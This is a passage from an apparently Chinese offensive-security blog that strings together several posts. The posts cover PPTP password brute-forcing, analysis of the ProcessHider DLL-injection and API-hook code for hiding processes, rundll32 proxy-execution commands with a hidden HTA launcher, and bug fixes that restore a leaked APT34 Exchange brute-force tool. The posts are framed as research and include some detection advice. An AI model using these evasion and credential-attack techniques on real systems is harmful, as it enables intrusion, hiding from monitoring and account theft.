<p>只有结束进程pptp后，才能获得回显</p>

<p>所以这里需要使用子进程的方式实现：</p>

<p>子进程执行pptpsetup命令，父进程不等待</p>

<p>随之产生新的问题：</p>

<p>如何获得子进程的结果，判断是否登录成功</p>

<p>这里选择一个简单直接的方法：</p>

<p>等待10秒，然后执行ifconfig，如果登录成功，会产生新的网卡设备<code class="language-plaintext highlighter-rouge">ppp0</code>，否则，当前用户名口令错误</p>

<p>登录成功后，选择清理进程，执行命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pkill pptp
</code></pre></div></div>

<p>清除连接信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pptpsetup --delete testvpn
</code></pre></div></div>

<p>完整代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-Python/blob/master/pptp_password_hack.py</p>

<p>代码会读取文件wordlist，获得口令字典，对指定IP尝试连接，连接成功后记录口令，清除进程和连接</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/7-1.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了命令行下导出PPTP配置信息和口令的方法，通过命令行能够实现开启和关闭VPN连接。</p>

<p>实例演示了Windows和Kali系统连接PPTP的方法，最后开源了调用pptpsetup实现PPTP口令爆破的脚本，分析脚本实现细节。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 23, 2018
  </div>

  
</article><article class="post">
  <h1>ProcessHider利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p><a href="https://github.com/M00nRise/ProcessHider">ProcessHider</a>能够在任务管理器和Process Explorer之类的监视工具中隐藏指定进程，本文将要介绍实现原理，分析代码细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>ProcessHider测试</li>
  <li>ProcessHider的实现原理</li>
  <li>ProcessHider的代码分析</li>
  <li>ProcessHider的检测</li>
</ul>

<h2 id="0x01-简介-1">0x01 简介</h2>
<hr>

<p>ProcessHider能够在任务管理器和Process Explorer之类的监视工具中隐藏指定进程</p>

<p>地址如下：</p>

<p>https://github.com/M00nRise/ProcessHider</p>

<p>支持以下参数：</p>

<ul>
  <li>pid</li>
  <li>进程名</li>
</ul>

<p>两种启动形式：</p>

<ul>
  <li>exe</li>
  <li>powershell</li>
</ul>

<p>ProcessHider能够自动识别操作系统版本和进程位数，向32位和64位进程分别注入Payload.dll，通过Hook API NtQuerySystemInformation()实现进程隐藏</p>

<p>注入的代码使用Dll反射，地址如下：</p>

<p>https://github.com/stephenfewer/ReflectiveDLLInjection</p>

<p>Hook的代码使用NtHookEngine，地址如下：</p>

<p>https://www.codeproject.com/Articles/21414/Powerful-x86-x64-Mini-Hook-Engine</p>

<p>参数实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ProcessHider.exe -n "putty.exe" -x "procexp.exe"
</code></pre></div></div>

<p>能够在procexp.exe中隐藏进程名putty.exe，并且默认针对以下进程进行隐藏：</p>

<ul>
  <li>Taskmgr.exe</li>
  <li>powershell.exe</li>
  <li>procexp.exe</li>
  <li>procexp64.exe</li>
  <li>perfmon.exe</li>
</ul>

<p><strong>注：</strong></p>

<p>目前不支持对tasklist.exe的进程隐藏</p>

<p>编译时需要注意的问题：</p>

<p>工程ProcessHider需要编译成32位，不能编译成64位</p>

<p>这是因为工程ProcessHider包含了针对64位进程的识别和利用代码</p>

<h2 id="0x02-processhider的实现原理">0x02 ProcessHider的实现原理</h2>
<hr>

<p>工程ProcessHider实现流程如下：</p>

<h3 id="1判断当前操作系统版本">1.判断当前操作系统版本</h3>

<p>对应代码<code class="language-plaintext highlighter-rouge">isSystem64BitWow()</code></p>

<p>如果是32位系统：</p>

<h4 id="1监控进程列表">(1)监控进程列表</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">LaunchDaemon(InjectAll);</code></p>

<h4 id="2向符合条件的进程注入payloaddll">(2)向符合条件的进程注入Payload.dll</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">reactToProcess((DWORD) pCurrent-&gt;ProcessId, pCurrent-&gt;ImageName.Buffer);</code></p>

<p>注入的代码使用了<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDLLInjection</a>中的代码</p>

<p>如果是64位系统：</p>

<h4 id="1同级目录下释放文件x64hiderexe用作64位的守护进程">(1)同级目录下释放文件x64Hider.exe，用作64位的守护进程</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">CopyResourceIntoFile(x64filesList[i], MAKEINTRESOURCE(x64resourceIDint[i])</code></p>

<h4 id="2解析命令行参数">(2)解析命令行参数</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">createCommandLine(argc, argv, buffer, MAX_COMMANDLINE_LEN);</code></p>

<h4 id="3启动64位的守护进程x64hiderexe">(3)启动64位的守护进程x64Hider.exe</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">CreateProcessFromLine(buffer,false);</code></p>

<p>传入启动的参数</p>

<p>示例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"c:\test\x64Hider.exe" "-n" "putty.exe" "-x" "cmd.exe"
</code></pre></div></div>

<h4 id="4将payloaddll写入x64hiderexe的进程空间">(4)将Payload.dll写入x64Hider.exe的进程空间</h4>

<p>这个过程不向硬盘写入文件，增加隐蔽性</p>

<p>对应代码<code class="language-plaintext highlighter-rouge">WriteDLLsToProcess(pi)</code></p>

<p>x64Hider.exe的功能如下：</p>

<ol>
  <li>监控64位的进程列表</li>
  <li>向符合条件的64位进程注入64位的Payload.dll</li>
</ol>

<h4 id="5监控32位的进程列表">(5)监控32位的进程列表</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">LaunchDaemon(InjectAll);</code></p>

<h4 id="6向符合条件的32位进程注入32位的payloaddll">(6)向符合条件的32位进程注入32位的Payload.dll</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">reactToProcess((DWORD) pCurrent-&gt;ProcessId, pCurrent-&gt;ImageName.Buffer);</code></p>

<p>Payload.dll分别对应工程x64Payload和x86Payload</p>

<p>这是基于ReflectiveDLLInjection实现的dll反射</p>

<p>优点是注入成功后在进程空间不存在dll的名称</p>

<p>流程如下：</p>

<h4 id="1创建互斥量">1.创建互斥量</h4>

<p>对应代码<code class="language-plaintext highlighter-rouge">hMutex = CreateMutex(0, TRUE, NULL);</code></p>

<h4 id="2读取参数">2.读取参数</h4>

<p>如果参数为空，从固定文件<code class="language-plaintext highlighter-rouge">"C:\Program Files\Internet Explorer\mdsint.isf"</code>读取参数</p>

<h4 id="3hook-api-ntquerysysteminformation">3.Hook API NtQuerySystemInformation()</h4>

<p>隐藏进程的代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NTSTATUS WINAPI HookedNtQuerySystemInformation(
	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID                    SystemInformation,
	__in       ULONG                    SystemInformationLength,
	__out_opt  PULONG                   ReturnLength
)
{
	NTSTATUS status = RealNTQueryFunc(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (SystemProcessInformation == SystemInformationClass &amp;&amp; NT_SUCCESS(status))
	{
		//
		// Loop through the list of processes
		//

		PSYSTEM_PROCESS_INFO pCurrent = NULL;
		PSYSTEM_PROCESS_INFO pNext = (PSYSTEM_PROCESS_INFO)SystemInformation;

		do
		{
			pCurrent = pNext;
			pNext = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurrent + pCurrent-&gt;NextEntryOffset);

			if (isHiddenProcess((int)pNext-&gt;ProcessId,pNext-&gt;ImageName.Buffer))
			{
				if (0 == pNext-&gt;NextEntryOffset)
				{
					pCurrent-&gt;NextEntryOffset = 0;
				}
				else
				{
					pCurrent-&gt;NextEntryOffset += pNext-&gt;NextEntryOffset;
				}

				pNext = pCurrent;
			}
		} while (pCurrent-&gt;NextEntryOffset != 0);
	}

	return status;
}
</code></pre></div></div>

<p>这段代码同SubTee之前开源的代码AppInitGlobalHooks-Mimikatz基本相同</p>

<p>我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8globalAPIhooks%E5%9C%A8Win7%E7%B3%BB%E7%BB%9F%E4%B8%8B%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/">《利用globalAPIhooks在Win7系统下隐藏进程》</a>有过介绍</p>

<p>SubTee的Github目前无法访问，但我当时fork了他的代码，地址如下：</p>

<p>https://github.com/3gstudent/AppInitGlobalHooks-Mimikatz/blob/master/AppInitHook/main.cpp#L39</p>

<p>所以说，我们使用之前的代码也能实现相同的功能</p>

<h4 id="1编译dll">1.编译dll</h4>

<p>使用代码：</p>

<p>https://github.com/3gstudent/AppInitGlobalHooks-Mimikatz/</p>

<p>编译生成dll</p>

<h4 id="2注入dll">2.注入dll</h4>

<p>这里可以使用我之前写的dll注入的代码，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/NtCreateThreadEx%20%2B%20LdrLoadDll.cpp</p>

<p>但是需要把<code class="language-plaintext highlighter-rouge">FreeDll()</code>的功能去掉</p>

<p>综上，ProcessHider的实现原理如下：</p>

<p>通过Dll注入来Hook API NtQuerySystemInformation()，实现进程隐藏</p>

<h2 id="0x03-processhider的检测">0x03 ProcessHider的检测</h2>
<hr>

<p>在检测上主要识别以下行为：</p>

<ul>
  <li>Dll注入</li>
  <li>Hook API NtQuerySystemInformation()</li>
</ul>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了ProcessHider的实现原理和代码细节，分析利用思路，给出检测建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January  9, 2020
  </div>

  
</article><article class="post">
  <h1>关于利用rundll32执行程序的分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近看到了一篇有趣的文章<a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/">《Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement》</a>，介绍了利用rundll32.exe加载url.dll，通过导出函数OpenURL执行程序的方法。于是我对此做了研究，整理成文，解决以下问题：</p>

<ul>
  <li>利用rundll32执行程序的细节和原理</li>
  <li>利用脚本批量扫描dll，查找能够执行程序的dll</li>
</ul>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>rundll32加载dll的用法</li>
  <li>OpenURL的用法</li>
  <li>API ShellExecute的用法</li>
  <li>三者结合实现通过rundll32直接执行程序</li>
  <li>寻找其他可用的导出函数</li>
  <li>利用powershell脚本批量获得dll的导出函数，筛选特定dll</li>
</ul>

<h2 id="0x02-相关细节">0x02 相关细节</h2>
<hr>

<h3 id="1rundll32加载dll的用法">1、rundll32加载dll的用法</h3>

<p>官方文档：</p>

<p>https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</p>

<p>用法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;
</code></pre></div></div>

<p>参数<code class="language-plaintext highlighter-rouge">&lt;entrypoint&gt;</code>代表传入dll的导出函数名，在dll中定义如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
</code></pre></div></div>

<p>参数<code class="language-plaintext highlighter-rouge">&lt;optional arguments&gt;</code>对应dll导出函数中的<code class="language-plaintext highlighter-rouge">LPSTR lpszCmdLine</code></p>

<p>也就是说通过rundll32能控制dll导出函数的<code class="language-plaintext highlighter-rouge">LPSTR lpszCmdLine</code>参数</p>

<h3 id="2openurl的用法">2、OpenURL的用法</h3>

<p>这里直接参考文章中的提示，找到url.dll，包含导出函数OpenURL</p>

<p>使用IDA查看url.dll的导出函数OpenURL，其中调用了API ShellExecute，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/2-1.png" alt="Alt text"></p>

<p>查看伪代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/2-2.png" alt="Alt text"></p>

<p>注意ShellExecute的第二个参数为NULL，第三个参数lpFile对应传入的参数lpFile</p>

<h3 id="3api-shellexecute的用法">3、API ShellExecute的用法</h3>

<p>函数原型与参数定义如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HINSTANCE ShellExecute(
  _In_opt_ HWND    hwnd,
  _In_opt_ LPCTSTR lpOperation,
  _In_     LPCTSTR lpFile,
  _In_opt_ LPCTSTR lpParameters,
  _In_opt_ LPCTSTR lpDirectory,
  _In_     INT     nShowCmd
);
</code></pre></div></div>

<p>第二个参数为NULL时，表示执行默认操作”open”</p>

<p>第三个参数lpFile表示要打开的程序或文件路径</p>

<p>也就是说，url.dll中导出函数OpenURL的参数lpFile决定API ShellExecute要打开的程序或文件路径</p>

<p>综上，</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe url.dll,OpenURL calc.exe
</code></pre></div></div>

<p>实际上的操作为<code class="language-plaintext highlighter-rouge">ShellExecuteA(hwnd, NULL, "calc.exe", NULL, NULL, nShowCmd);</code>，即执行计算器</p>

<p>使用Immunity Debugger动态调试，跟踪到<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>，验证判断，传入的参数为<code class="language-plaintext highlighter-rouge">calc.exe</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/2-3.png" alt="Alt text"></p>

<h2 id="0x03-扩展利用">0x03 扩展利用</h2>
<hr>

<h3 id="1查找urldll中其它可供利用的导出函数">1、查找url.dll中其它可供利用的导出函数</h3>

<p>IDA加载url.dll，选择<code class="language-plaintext highlighter-rouge">Search</code> - <code class="language-plaintext highlighter-rouge">text...</code>，搜索<code class="language-plaintext highlighter-rouge">ShellExecuteA</code></p>

<p>导出函数FileProtocolHandler同样调用API ShellExecute，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/3-1.png" alt="Alt text"></p>

<p>测试命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe url.dll,FileProtocolHandler calc.exe
</code></pre></div></div>

<p>执行计算器</p>

<h3 id="2查看其它dll是否包含导出函数openurl">2、查看其它dll是否包含导出函数OpenURL</h3>

<p><strong>实现思路：</strong></p>

<p>枚举<code class="language-plaintext highlighter-rouge">%windir%/system32</code>下所有dll的导出函数，筛选出包含导出函数OpenURL的dll</p>

<p>通过powershell获得dll的导出函数可参考FuzzySecurity的代码，地址如下：</p>

<p>https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1</p>

<p>在这个代码的基础上，添加枚举dll的功能，分别获得导出函数，进行判断</p>

<p><strong>实现细节：</strong></p>

<p>(1)枚举<code class="language-plaintext highlighter-rouge">c:\windows\system32</code>下的所有dll：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$DllSearchPath = dir c:\windows\system32\*.dll

foreach($DllName in $DllSearchPath)
{   
	$DllName.Name
}
</code></pre></div></div>

<p>(2)对于<code class="language-plaintext highlighter-rouge">c:\windows\system32\auditpolmsg.dll</code></p>

<p>会报错提示输入字符串的格式不正确，所以对语句<code class="language-plaintext highlighter-rouge">$OffsetPtr = New-Object System.Intptr -ArgumentList $($HModule.ToInt64() + $ExportRVA)</code>加入try catch判断</p>

<p>代码位置：</p>

<p>https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1#L141</p>

<p>(3)对于<code class="language-plaintext highlighter-rouge">c:\windows\system32\avicap.dll</code></p>

<p>会报错，尝试读取或写入受保护的内存，对语句<code class="language-plaintext highlighter-rouge">$EXPORT_DIRECTORY_FLAGS = [system.runtime.interopservices.marshal]::PtrToStructure($OffsetPtr, [type]$IMAGE_EXPORT_DIRECTORY)</code>
加入try catch判断</p>

<p>(4)目前代码只支持32位dll的判断</p>

<p>完整代码可参考：</p>

<p>https://raw.githubusercontent.com/3gstudent/Writeup/master/Find-OpenURL.ps1</p>

<p>执行如下图，获得其他两个dll，分别为ieframe.dll和shdocvw.dll</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/3-2.png" alt="Alt text"></p>

<p>使用IDA加载ieframe.dll，查看导出函数OpenURL，伪代码如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/3-3.png" alt="Alt text"></p>

<p>由<code class="language-plaintext highlighter-rouge">CInternetShortcut</code>可以得知执行的文件为.url文件</p>

<p>编写一个.url文件，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[InternetShortcut]
URL=c:\windows\system32\calc.exe
</code></pre></div></div>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe ieframe.dll,OpenURL C:\4\calc.url
</code></pre></div></div>

<p>成功执行，弹出计算器</p>

<p>同样，shdocvw.dll也是相同的测试结果</p>

<h3 id="3执行的程序类型">3、执行的程序类型</h3>

<p>调用API ShellExecute执行程序，不仅支持exe，也同样支持脚本</p>

<p>例如执行js文件，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo("1");
</code></pre></div></div>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe url.dll,OpenURL C:\4\echo.js
</code></pre></div></div>

<p>执行后弹框</p>

<p>例如hta文件，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;HTML&gt; 
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
&lt;HEAD&gt; 
&lt;script language="VBScript"&gt;
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc.exe"
self.close
&lt;/script&gt;
&lt;body&gt;
demo
&lt;/body&gt;
&lt;/HEAD&gt; 
&lt;/HTML&gt; 
</code></pre></div></div>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe url.dll,OpenURLA C:\4\calc.hta
</code></pre></div></div>

<p>执行后弹出计算器</p>

<p>例如url文件，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[InternetShortcut]
URL=c:\windows\system32\calc.exe
</code></pre></div></div>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe ieframe.dll,OpenURL C:\4\calc.url
</code></pre></div></div>

<p>成功执行，弹出计算器</p>

<h3 id="4更多利用方法">4、更多利用方法</h3>

<p>hexacorn在他的<a href="http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/">文章</a>里分享了另一个可供使用的dll和导出函数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 zipfldr.dll, RouteTheCall calc.exe
</code></pre></div></div>

<p>当然，还有更多可供使用的dll，本文暂不介绍</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文分析了利用rundll32.exe加载url.dll并通过导出函数OpenURL执行程序的细节，对其扩展，尝试利用脚本批量扫描<code class="language-plaintext highlighter-rouge">%windir%/system32</code>下的dll，找到能够执行程序的dll，分别验证了bohops和Hexacorn的结论。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 21, 2018
  </div>

  
</article><article class="post">
  <h1>对APT34泄露工具的分析——Jason</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Jason是由Lab Dookhtegan在2019年6月3日泄露的另一款工具，用于Exchange账户的暴力破解</p>

<p>然而，泄露的这款工具虽然包括源码，但存在一些bug，无法正常使用</p>

<p>本文不会分析Jason和APT34之间的关联，仅在技术研究的角度，修复Jason的bug，恢复Jason的功能，分析使用的技术，同其他开源工具做横向比较</p>

<p><strong>注：</strong></p>

<p>之前关于APT34的分析文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90-PoisonFrog%E5%92%8CGlimpse/">《对APT34泄露工具的分析——PoisonFrog和Glimpse》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90-HighShell%E5%92%8CHyperShell/">《对APT34泄露工具的分析——HighShell和HyperShell》</a></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Jason的开源资料</li>
  <li>修复Jason的bug</li>
  <li>实际测试Jason</li>
  <li>同其他开源工具的横向比较</li>
</ul>

<h2 id="0x02-jason的开源资料">0x02 Jason的开源资料</h2>
<hr>

<p>Jason最早泄露于Telegram的频道：https://t.me/lab_dookhtegana</p>

<p>p3pperp0tts将其上传至Github，地址如下：</p>

<p>https://github.com/p3pperp0tts/APT34/tree/master/Jason</p>

<p>文件夹decompiled_code内为Jason的源码</p>

<p>Jason采用EWS Managed API来实现对Exchange资源的访问</p>

<p><strong>注：</strong></p>

<p>关于EWS Managed API的使用细节可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/">《Exchange Web Service(EWS)开发指南》</a></p>

<p>经过简单的修复，我在VS2015下能够编译成功</p>

<p>但在测试环境中，Jason无法识别正确的邮箱用户名和口令，所有测试结果均失败</p>

<h2 id="0x03-修复jason的bug">0x03 修复Jason的bug</h2>
<hr>

<p>编译环境: VS2015</p>

<p>为了恢复正常功能，源代码需要修改以下4个位置</p>

<h3 id="1添加microsoftexchangewebservicesdll的引用">1.添加Microsoft.Exchange.WebServices.dll的引用</h3>

<p>我这里是将Microsoft.Exchange.WebServices.dll放在工程的同级目录下，并做了引用</p>

<h3 id="2证书信任策略的bug修正">2.证书信任策略的bug修正</h3>

<p>位置：Form1.cs</p>

<p>原代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ServicePointManager.ServerCertificateValidationCallback = ((object &lt;p0&gt;, X509Certificate &lt;p1&gt;, X509Chain &lt;p2&gt;, SslPolicyErrors &lt;p3&gt;) =&gt; true);
</code></pre></div></div>

<p>修改后的代码:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) =&gt; { return true; };
</code></pre></div></div>

<h3 id="3变量赋值的bug修正">3.变量赋值的bug修正</h3>

<p>位置：Form1.cs</p>

<p>(1)共有两个位置</p>

<p>原代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MainConfig.AppLocation + "out.txt";
</code></pre></div></div>

<p>修改后的代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MainConfig.AppLocation = MainConfig.AppLocation + "out.txt";
</code></pre></div></div>

<p>(2)共有两个位置</p>

<p>原代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MainConfig.UsernameStart + userClass.Username + MainConfig.UsernameEnd;
</code></pre></div></div>

<p>修改后的代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>userClass.Username = MainConfig.UsernameStart + userClass.Username + MainConfig.UsernameEnd;
</code></pre></div></div>

<h3 id="4ews和oab的判断有问题">4.EWS和OAB的判断有问题</h3>

<p>经过测试，变量MainConfig.Method的值始终为空</p>

<p>需要修正MainConfig.Method无法取值的bug</p>

<p>位置：Form1.cs</p>

<p>原代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MainConfig.Method = this.cmbMethod.SelectedText;
</code></pre></div></div>

<p>修改后的代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MainConfig.Method = (string)this.cmbMethod.SelectedItem;
</code></pre></div></div>

<p>实现完整功能的工程我已上传至github，地址如下:</p>

<p>https://github.com/3gstudent/APT34-Jason</p>

<h2 id="0x04-实际测试jason">0x04 实际测试Jason</h2>
<hr>

<p>编译成功后生成文件Jason.exe</p>

<p>在同级目录需要文件Microsoft.Exchange.WebServices.dll，程序才可以正常运行</p>

<p>程序启动后，需要设置的配置如下：</p>

<h3 id="1exchange-address">1.Exchange Address</h3>

<p>输入Exchange服务器的URL</p>

<p>在我的测试环境下，Exchange Address为：https://192.168.206.17</p>

<h3 id="2exchange-version">2.Exchange Version</h3>

<p>选择对应的版本</p>

<p>此处选择低版本能够适用于高版本的Exchange服务器</p>

<h3 id="3bf-method">3.BF Method</h3>

<p>三个选项：</p>

<ul>
  <li>EWS(Exchange Web Service)</li>
  <li>OAB(Offline Address Book)</li>
  <li>Full</li>
</ul>

<p>通常选择EWS</p>

<h3 id="4username-file">4.Username File</h3>

<p>用户名的字典文件</p>

<p>格式可参考PassSample.txt中提示的格式</p>

<p>我的测试环境下，我用的格式示例为：</p>

<p>test1@test.com
admin@test.com</p>

<h3 id="5password-file">5.Password File</h3>

<p>口令字典文件</p>

<h3 id="6number-of-threads">6.Number of Threads</h3>

<p>设置扫描线程个数</p>

<h3 id="7generate-pass">7.Generate Pass</h3>

<p>点击后显示暴力破解使用的字典</p>

<h3 id="8generate-pass-per">8.Generate Pass Per</h3>

<p>点击后生成文件夹PasswordPerUser，文件夹中生成以每个用户名命名的txt文件，内容为口令字典</p>

<h3 id="9add-to-username-start">9.Add to Username Start</h3>

<p>产生新的用户，将输入的字符加在用户名前面</p>

<p>测试环境下建议不设置</p>

<h3 id="10add-to-username-end">10.Add to Username End</h3>

<p>产生新的用户，将输入的字符加在用户名后面</p>

<p>测试环境下建议不设置</p>

<p>我的测试环境下，配置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-30/2-1.png" alt="Alt text"></p>

<p>暴力破解成功后，生成日志文件out-year-month-day-hour-minute-second.txt，保存用户名和对应的口令</p>

<h2 id="0x05-同其他开源工具的横向比较">0x05 同其他开源工具的横向比较</h2>
<hr>

<h3 id="1jason">1.Jason</h3>

<ul>
  <li>C#实现</li>
  <li>对Exchange进行暴力破解的位置：
    <ul>
      <li>https://url/ews/exchange.asmx</li>
      <li>https://url/oab</li>
    </ul>
  </li>
  <li>支持多线程</li>
  <li>界面操作</li>
</ul>

<h3 id="2mailsniper">2.MailSniper</h3>

<ul>
  <li>https://github.com/dafthack/MailSniper</li>
  <li>Powershell实现</li>
  <li>对Exchange进行暴力破解的位置：
    <ul>
      <li>https://url/ews/exchange.asmx</li>
      <li>https://url/owa</li>
    </ul>
  </li>
  <li>支持多线程</li>
  <li>命令行操作</li>
</ul>

<h3 id="3ruler">3.Ruler</h3>

<ul>
  <li>https://github.com/sensepost/ruler</li>
  <li>Go实现</li>
  <li>对Exchange进行暴力破解的位置：
    <ul>
      <li>https://url/autodiscover/autodiscover.xml</li>
    </ul>
  </li>
  <li>不支持多线程</li>
  <li>命令行操作</li>
</ul>

<p>对于Exchange账户的暴力破解，在原理上大同小异，都是访问Exchange的Web资源，如果返回401表示验证失败，如果获得预期结果代表用户口令正确</p>

<p>对于Jason，同MailSniper和Ruler相比，原理和功能基本相同，个人认为该工具不存在被大规模滥用的隐患，也不会导致恶意软件技术的升级</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了如何修复Jason的bug，分析其中的技术，同其他开源工具做了横向比较，得出最终结论：个人认为该工具不存在被大规模滥用的隐患，也不会导致恶意软件技术的升级</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 30, 2019
  </div>

  
</article><article class="post">
  <h1>Windows Shellcode学习笔记——通过VisualStudio生成shellcode</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>shellcode是一段机器码，常用作漏洞利用中的载荷(也就是payload)</p>

<p>在渗透测试中，最简单高效的方式是通过metasploit生成shellcode，然而在某些环境下，需要定制开发自己的shellcode，所以需要对shellcode的开发作进一步研究</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>编写Shellcode的基本方式有3种：</p>

<ul>
  <li>直接编写十六进制操作码</li>
  <li>采用C或者Delphi这种高级语言编写程序，编译后，对其反汇编进而获得十六进制操作码</li>
  <li>编写汇编程序，将该程序汇编，然后从二进制中提取十六进制操作码</li>
</ul>

<p>本文将介绍如何通过Visual Studio编写c代码来生成shellcode，具体包含以下三部分内容：</p>

<ul>
  <li>利用vc6.0的DEBUG模式获取shellcode</li>
